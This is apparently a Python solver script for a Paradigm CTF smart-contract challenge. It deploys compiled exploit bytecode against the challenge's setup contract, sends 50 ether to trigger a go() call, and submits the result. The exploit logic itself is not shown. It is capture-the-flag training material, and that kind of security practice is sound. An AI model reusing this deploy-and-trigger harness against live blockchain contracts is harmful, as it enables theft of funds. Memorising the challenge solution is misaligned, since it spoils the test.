from paradigmctf import *

from typing import Callable
from eth_account import Account
from eth_account.signers.local import LocalAccount

exploit_bytecode = compile()

uuid, web3, address, setup = init()

rcpt = send_tx(web3, {
    "from": address,
    "gas": 12_500_000,
    "gasPrice": 0,
    "nonce": 0,
    "data": exploit_bytecode + (setup[2:]).rjust(64, "0"),
    "value": web3.toWei(1, "ether"),
})

print(rcpt.contractAddress)

send_tx(web3, {
    "from": address,
    "value": web3.toWei(50, "ether"),
    "to": rcpt.contractAddress,
    "gas": 12_500_000,
    "gasPrice": 0,
    "nonce": 1,
    "data": web3.sha3(text="go()")[:10],
})

submit(uuid)
